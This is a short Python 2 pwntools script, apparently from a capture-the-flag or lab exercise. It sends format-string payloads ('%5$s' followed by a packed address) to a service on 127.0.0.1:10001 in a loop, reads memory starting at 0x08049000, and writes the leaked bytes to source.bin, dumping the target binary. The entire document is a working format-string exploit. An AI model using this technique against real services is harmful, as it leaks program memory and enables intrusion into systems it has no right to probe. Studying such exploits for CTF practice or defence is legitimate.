from pwn import *

context.log_level = 'debug'
f = open("source.bin", "ab+")

begin = 0x08049000
offset = 0

while True:
    addr = begin + offset
    p=remote('127.0.0.1',10001)
    p.sendline("%5$s" + p32(addr))
    try:
        info = p.recv()
    except EOFError:
        print offset
        break
    info += "\x00"
    p.close()
    offset += len(info)
    f.write(info)
    f.flush()

f.close()
